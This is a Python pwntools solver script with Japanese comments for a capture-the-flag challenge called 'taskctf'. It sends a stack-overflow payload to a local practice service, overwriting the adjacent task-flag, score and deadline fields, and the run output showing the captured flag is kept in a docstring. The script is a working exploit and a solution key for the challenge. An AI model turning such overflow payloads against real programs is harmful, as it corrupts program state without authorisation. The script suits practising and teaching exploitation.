from pwn import *

ADDR = '127.0.0.1'
PORT = 30004

io = remote(ADDR, PORT)

print(io.recvuntil(b'name\n'))

payload = b'A' * 16 # name用の部分を全部埋める
payload += b'\x01\x00\x00\x00' # is_doneに1を入れる
payload += b'\x37\x13\x00\x00' # scoreに1337を入れる
payload += b'A' * 8
payload += b'\x77\xa9\xb6\x61' # 良さげな値を入れる

io.sendline(payload)
io.interactive()

"""
$ python3 solver/solve.py 
[+] Opening connection to 127.0.0.1 on port 30004: Done
b'Input task name\n'
[*] Switching to interactive mode
task
task name: AAAAAAAAAAAAAAAA
task done: 1
task score: 4919
task deadline: Mon Dec 13 02:01:27 2021

taskctf{n0w_y0u_kn0w_t1me_t}[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 30004
"""